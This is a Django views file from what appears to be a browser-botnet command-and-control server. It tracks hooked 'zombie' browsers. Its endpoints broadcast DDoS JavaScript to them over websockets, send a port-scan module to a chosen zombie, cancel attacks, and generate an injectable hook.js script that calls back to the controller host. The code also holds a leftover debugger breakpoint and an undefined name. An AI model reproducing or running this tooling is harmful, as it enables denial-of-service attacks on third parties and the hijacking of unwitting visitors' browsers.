from django.shortcuts import render

# Create your views here.
from ws4redis.publisher import RedisPublisher
from ws4redis.redis_store import RedisMessage
from django.views.generic.base import View,TemplateResponseMixin,ContextMixin
from rest_framework import viewsets

from rest_framework.views import APIView
from rest_framework.permissions import IsAuthenticated

from .models import Zombie,Attacker
from rest_framework.response import Response
from rest_framework.decorators import list_route
import pdb
import simplejson
from django.views.decorators.cache import never_cache
from django.http import HttpResponse
import os


class IndexPage(View,TemplateResponseMixin,ContextMixin):
        template_name='index.html'
        def get_context_data(self, **kwargs):
            #set up context
            context = super(IndexPage,self).get_context_data(**kwargs)
            context['zombies'] = Zombie.objects.all()
            return context
        @never_cache
        def get(self,request):
            pdb.set_trace()
            #create attacker sesssion and model object if doesn't exist
            if not request.session.exists(request.session.session_key):
                    request.session.create()
                    Attacker.objects.create(sesskey=request.session.session_key)
            else:
                Attacker.objects.get_or_create(sesskey=request.session.session_key)
            return self.render_to_response(self.get_context_data())


class Controller(viewsets.ModelViewSet):

    @list_route(methods=['post'])
    def ddos(self,request,pk=None):
        #target ip and speed of requests
        target = request.data['targetip']
        timeout = request.data['timeout']

        redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=True)
        #fetch js
        code =None
        try:
            with open(os.getcwd()+"/ccstation/static/modules/ddos.js","r") as f:
                code = f.read()
        except IOError as e:
            return HttpResponse("Failed to fetch ddos code: "+e)


        args = simplejson.dumps({'target':target,'timeout':timeout});
        # tell over Websocket zombies to attack target
        redis_publisher.publish_message(RedisMessage(simplejson.dumps({'code': code,'args':args})))
        #ack to controller
        return Response({'ack':'ddos'})

    #cancels current attack for selected zombies
    @list_route(methods=['post'])
    def cancel(self,request,pk=None):
        #cancel for N zombies
        if 'zombies' in request.data:
            redis_publisher = RedisPublisher(facility='solo',sessions=[Zombies.objects.get(host=h).sesskey for h in request.data['zombies']])
            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'stopattack':'true'})))
        #cancel for all zombies
        else:
            redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=True)
            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'stopattack':'true'})))
        #ack to controller
        return Response({'ack':'canceled'})

    #port scan
    @list_route(methods=['post'])
    def localportscan(self,request,pk=None):

        target = request.data['targetnet']
        timeout = 3
        try:
            timeout = int(request.data['timeout'])
        except KeyError:
            pass
        #fetch cell
        code =None
        try:
            with open(os.getcwd()+"/ccstation/static/modules/portscan.js","r") as f:
                code = f.read()
        except IOError as e:
            return HttpResponse("Failed to fetch portscan code: "+e)
        #tell zombie to scan network
        try:
            redis_publisher = RedisPublisher(facility='solo', sessions=[Zombie.objects.get(host=target).sesskey])
            args = simplejson.dumps({'server':request.get_host(),'timeout':timeout});
            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'args':args,'code':code})))
        except Zombie.DoesNotExist:
            return Response({'failed':'no such zombie'})
        #ack to controller
        return Response({'ack':'portscan'})

    #creates script to inject into zombies
    @list_route(methods=['post'])
    def hookcreate(self,request,pk=None):
        #add ws redis
        wsredis =None
        try:
            with open(os.getcwd()+"/ccstation/static/js/ws4redis.min.js","r") as f:
                wsredis = f.read()
        except IOError as e:
            print(e)
            return HttpResponse("failed to setup hook script:"+e)

        #add jquery min
        jquery =None
        try:
            with open(os.getcwd()+"/ccstation/static/js/jquery.min.js","r") as f:
                jquery = f.read()
        except IOError as e:
            return HttpResponse("Failed to setup hook script: "+e)

        headers = wsredis+jquery
        #server ip
        ipstr=  'var host = "{ipaddressport}";\n'
        #get injection script
        injection = open(os.getcwd()+"/ccstation/static/protohook.js").read()
        #format for user
        injection = headers+ipstr.format(ipaddressport=request.get_host())+injection
        #attempt to create injection script
        try:
            with open(os.getcwd()+"/ccstation/static/hook.js",'w+') as f:
                    f.write(injection)
                    return HttpResponse(simplejson.dumps({'resp':"src=\"http://"+request.get_host()+":2000/static/hook.js\""}),content_type='application/json')
        except IOError as e:
            return HttpResponse(e)
